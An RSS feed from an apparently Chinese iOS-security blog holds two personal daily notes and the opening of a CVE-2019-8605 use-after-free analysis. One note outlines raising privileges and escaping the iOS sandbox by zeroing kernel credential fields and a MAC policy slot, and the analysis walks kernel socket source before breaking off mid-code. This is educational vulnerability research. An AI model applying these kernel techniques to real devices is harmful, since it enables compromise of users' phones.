<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" title="XSL Formatting" href="/rss.xsl" media="all" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>wnagzihxa1n</title>
        <description>大土豆的菜栏</description>
        <link>http://localhost:4000</link>
        <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
        
            <item>
                <title>大土豆安全笔记 2021.02.05 我哭着给快手师傅们道喜</title>
                <description>&lt;p&gt;听说今天快手上市了，我又被一大堆同龄的快手师傅们甩的远远的，眼泪止不住的流下来&lt;/p&gt;

&lt;p&gt;近期看了一些iOS内核的漏洞，感觉对比较基础的概念有一点点了解了，接下来准备打基础，仔细学习下《Mac OS X技术内幕》这本书的重点章节，感觉大部分都是重点章节&lt;/p&gt;

&lt;p&gt;吾爱破解2020年的精华榜，大家可以去围观一下，对于我这种安全入门新手来说，每年的精华榜都必须要看一遍的，很涨姿势&lt;/p&gt;

&lt;p&gt;《吾爱破解论坛2020年优秀、精华TOP榜（上）》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.52pojie.cn/thread-1349274-1-1.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《吾爱破解论坛2020年原创区、悬赏值TOP榜（下）》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.52pojie.cn/thread-1356509-1-1.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里我夹带点私货，关于吾爱破解和看雪这两个论坛我比较喜欢前者，我这些年写过一些自认为比较有质量的文章一般也都会在吾爱破解上面发&lt;/p&gt;

&lt;p&gt;对了，我还是2016年精华榜第一名，论坛的老板们给我寄了三本技术书和一个腾讯公仔，我一直留着，作为当时还是一个学生的我来说，其实是挺大的鼓舞&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FC0DE0C9B13A2B46D6EFAD41ECDC8D4A.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我现在有个重要任务是多认识一些搞iOS安全的师傅，一个人玩也没啥朋友可以交流实在是太难了，所以接下来一些比较有质量的文章我会多平台都发一遍，公众号，博客，安全客，吾爱破解，看雪&lt;/p&gt;

&lt;p&gt;安全客有稿费，如果是钱比较多的那种文章，我会直接投稿安全客，其它平台就不发了&lt;/p&gt;

&lt;p&gt;师傅们要是也在搞iOS安全的可以加我微信啊，加了不吃亏，加了不上当，逢年过节我还可以当个气氛组给您各位发节日祝福&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B207A13CA6081A293B207CAA681CE278.jpg&quot; alt=&quot;招财大土豆的微信二维码.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;无意中看到一个GitHub项目，安全圈公众号汇总，不出意料，又没有我，看来我确实是没在圈内&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/DropsOfZut/awesome-security-weixin-official-accounts&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;再接再厉努力输出呗，还能咋的啊&lt;/p&gt;

&lt;p&gt;前段时间完成了从UAF到TFP0的学习，最近在看沙箱逃逸，最终结果当然是很简单，把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l_perpolicy[1]&lt;/code&gt;置为0即可&lt;/p&gt;

&lt;p&gt;简单描述一下过程：结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proc&lt;/code&gt;用于描述进程，结构体成员&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p_ucred&lt;/code&gt;指向结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ucred&lt;/code&gt;，提权的话把这个结构体一大堆成员都置为0，注意它后面一个成员&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cr_label&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct ucred {
	TAILQ_ENTRY(ucred)	cr_link; /* never modify this without KAUTH_CRED_HASH_LOCK */
	u_long	cr_ref;			/* reference count */
    struct posix_cred {
        uid_t	cr_uid;			/* effective user id */
        uid_t	cr_ruid;		/* real user id */
        uid_t	cr_svuid;		/* saved user id */
        ...
    } cr_posix;
	struct label	*cr_label;	/* MAC label */
	struct au_session cr_audit;		/* user auditing data */
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;成员&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cr_label&lt;/code&gt;用于存储MAC策略，每一个MAC策略实际由&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l_perpolicy[]&lt;/code&gt;存储&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct label {
	int	l_flags;
	union {
		void	*l_ptr;
		long	 l_long;
	}	l_perpolicy[MAC_MAX_SLOTS];
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l_perpolicy[]&lt;/code&gt;第一个slot存储AMFI，第二个slot存储Sandbox，以此类推，下面的内存布局就很好的展示了这一点，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xfffffff00267ac00&lt;/code&gt;指向的是AMFI，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xfffffff002109b20&lt;/code&gt;指向的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sandbox&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xfffffff002ad0380  01 00 00 00 00 00 00 00  [0xfffffff00267ac00]
0xfffffff002ad0390  [0xfffffff002109b20]     00 00 00 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;关于从TFP0到Sandbox Escape的文章我在农历年前会发出来，详细描述了MACF，AMFI，Sandbox等概念，我写的文章大家都知道的，说详细那真的是详细&lt;/p&gt;

&lt;p&gt;贴一些我学习这些知识的过程中读过比较好的文章&lt;/p&gt;

&lt;p&gt;《深度长文：细说iOS代码签名》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://xelz.info/blog/2019/01/11/ios-code-signature/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《手把手教你突破iOS 9.x的用户空间防护》&lt;/p&gt;

&lt;p&gt;《New approaches to operating system security extensibility》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.cl.cam.ac.uk/techreports/UCAM-CL-TR-818.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《Monitoring macOS, Part I: Monitoring Process Execution via MACF》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.fortinet.com/blog/threat-research/monitoring-macos–part-i–monitoring-process-execution-via-macf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《Chapter 6. The TrustedBSD MAC Framework》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://docs.freebsd.org/en_US.ISO8859-1/books/arch-handbook/mac.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《The Apple Sandbox》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://dl.packetstormsecurity.net/papers/general/apple-sandbox.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《Hack in the (sand)Box》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://newosxbook.com/files/HITSB.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我看了一篇关于程序员转行考公务员的帖子，写的挺好，非常清晰的程序员思维，从描述来看应该是同龄人，2017年毕业进了互联网公司写代码，现在考公上岸，整体看下来，考公还是挺复杂的，流程相当繁琐&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/coder2gwy/coder2gwy&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;全国各地公务员待遇水平，确实还是一线大城市舒服一些&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.zhihu.com/question/21282141&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;像我这样的就不适合当个公务员，我都计划好了，等我四五十岁赚够了钱，早早退休到海边盖个院子，承包一块近海养殖场，每天开船出海钓钓鱼，小院子里种种菜，隔三差五好朋友们来家里坐坐，我给弄一桌野生海鲜和绿色蔬菜，巴适得板！&lt;/p&gt;

&lt;p&gt;说回到眼前，我今年如果iOS/macOS搞的不错，我想年底的时候尝试投一下能够做安全研究的实验室，比如华为的Singular Security Lab，腾讯的Keen Team，方向为iOS和macOS系统安全&lt;/p&gt;
</description>
                <pubDate>Fri, 05 Feb 2021 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2021/02/05/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.02.05.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2021/02/05/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.02.05.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2021.01.31 抓紧时间涨粉到五百！</title>
                <description>&lt;p&gt;上次我说年前冲个绩效涨粉到五百，准备了大半个月写了一篇越狱的文章，不算代码，汉字统计一共写了一万五千字，结果凉凉&lt;/p&gt;

&lt;p&gt;还是要提一嘴，这篇文章可以说是我这两年来写的最走肾的一篇漏洞分析，我搞安卓漏洞都没这么认真&lt;/p&gt;

&lt;p&gt;还是说因为我太菜所以没人关注，emmmmmm&lt;/p&gt;

&lt;p&gt;年前跟老板说涨两百块工资的事看来得放一放了，怕刚提完涨工资领导就让我提桶走人&lt;/p&gt;

&lt;p&gt;苹果在iOS 14的iMessage里新增了一个安全沙箱，叫作&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Blastdoor&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;PJ0的Saelo发了一篇《A Look at iMessage in iOS 14》专门讲iOS 14的iMessage都做了哪些改动&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://googleprojectzero.blogspot.com/2021/01/a-look-at-imessage-in-ios-14.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在iOS 14.4的iMessage里可以调用的系统函数白名单&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://gist.github.com/Proteas/19048a7787dd0356baf9b310f640accb&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《FPS网络游戏自动瞄准漏洞分析以及实现》，原来CS那些自动瞄准外挂这么复杂&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.52pojie.cn/thread-863154-1-1.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;随意感受一下这里面浓浓的数学知识&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/84729BD23A8DAA48CCA1C7DAA4764DCF.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;以下是两篇研究硬件安全的文章，不太懂怎么玩家里那些智能设备的同学可以看看别人是怎么研究的&lt;/p&gt;

&lt;p&gt;《海康萤石智能门锁的网关分析》，拿到一个硬件设备之后吹芯片，提固件，逆向分析的过程&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.52pojie.cn/thread-1255338-1-1.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《看我如何PWN掉一款老旧的TCL电视》，跟上一篇比，这篇文章也涨姿势，就是短了点&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.52pojie.cn/thread-1103710-1-1.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对了，因为iOS/macOS的漏洞分析一般我都写的比较长，所以每篇文章我都会导出PDF版本，方便感兴趣的同学下载，欢迎一键三连&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/wnagzihxa1n/iOS-macOS-Vul-Analysis-Articles&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;包括代码高亮我选择的是浅色，有打印需求的同学可以放心打印，不会有大片黑色看不清的情况&lt;/p&gt;
</description>
                <pubDate>Sun, 31 Jan 2021 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2021/01/31/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.31.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2021/01/31/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.31.html</guid>
            </item>
        
            <item>
                <title>CVE-2019-8605 FROM UAF TO TFP0</title>
                <description>&lt;p&gt;&lt;strong&gt;PDF版本请点击&lt;a href=&quot;/assets/pdf/CVE-2019-8605%20FROM%20UAF%20TO%20TFP0.pdf&quot;&gt;此处&lt;/a&gt;下载&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这篇文章的开始是我看了Ned Williamson的一个漏洞&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1806&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;同时还在PJ0的博客上发了一篇非常非常棒的文章&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;公告&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// https://support.apple.com/en-us/HT210549

Available for: iPhone 5s and later, iPad Air and later, and iPod touch 6th generation

Impact: A malicious application may be able to execute arbitrary code with system privileges

Description: A use after free issue was addressed with improved memory management.

CVE-2019-8605: Ned Williamson working with Google Project Zero
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;1-开发层面的socket&quot;&gt;1. 开发层面的Socket&lt;/h2&gt;

&lt;p&gt;如公告所描述，这是一个存在于Socket中的UAF漏洞&lt;/p&gt;

&lt;p&gt;一般搞开发的同学对于Socket更多的是了解到开发层面，比如使用Socket通信，我们从开发层面开始，逐步分析到底层&lt;/p&gt;

&lt;p&gt;我们在学习计算机网络的时候，通过逻辑分层将网络分为七层，也叫作七层模型&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://en.wikipedia.org/wiki/OSI_model&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;后来又出现了更为符合使用习惯的四层模型&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://en.wikipedia.org/wiki/Internet_protocol_suite&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;socket()&lt;/code&gt;的原型如下，一共有三个参数&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protocol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第一个参数domain：协议族，比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AF_INET&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AF_INET6&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;第二个参数type：socket类型，比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOCK_STREAM&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOCK_DGRAM&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOCK_RAW&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define	SOCK_STREAM	1		&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* stream socket */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	SOCK_DGRAM	2		&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* datagram socket */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	SOCK_RAW	3		&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* raw-protocol interface */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#if !defined(_POSIX_C_SOURCE) || defined(_DARWIN_C_SOURCE)
#define	SOCK_RDM	4		&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* reliably-delivered message */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#endif	&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* (!_POSIX_C_SOURCE || _DARWIN_C_SOURCE) */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#define	SOCK_SEQPACKET	5		&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* sequenced packet stream */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第三个参数protocol：传输协议，比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPPROTO_TCP&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPPROTO_UDP&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;创建一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Socket&lt;/code&gt;对象的代码如下&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[-] Can't create socket, error %d (%s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strerror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果要使用它作为服务端，还需要调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bind()&lt;/code&gt;绑定本地端口，然后调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;listen()&lt;/code&gt;进行监听，最后在循环体内调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accept()&lt;/code&gt;与客户端建立连接，之后就可以发送数据通信了&lt;/p&gt;

&lt;p&gt;关于Socket网络编程有一份文档写的真的很好，墙裂建议阅读&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://beej.us/guide/bgnet/html/#socket&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;2-漏洞源码分析&quot;&gt;2. 漏洞源码分析&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;用户态函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disconnectx()&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;这个函数很难在搜索网站上搜到相关文档信息，我最后是通过源码阅读来理解这个函数调用在Poc里的作用&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__API_AVAILABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;macosx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ios&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tvos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;watchos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;disconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_associd_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_connid_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;mi&quot;&gt;448&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;AUE_NULL&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ALL&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_associd_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_connid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过分发，会调用到这个内核态函数，然后调用位置1的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disconnectx_nocancel()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;disconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disconnectx_args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/*
	 * Due to similiarity with a POSIX interface, define as
	 * an unofficial cancellation point.
	 */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;__pthread_testcancel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disconnectx_nocancel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 1&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;位置2的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_socket()&lt;/code&gt;获取结构体变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so&lt;/code&gt;，最后调用位置3的函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sodisconnectx()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
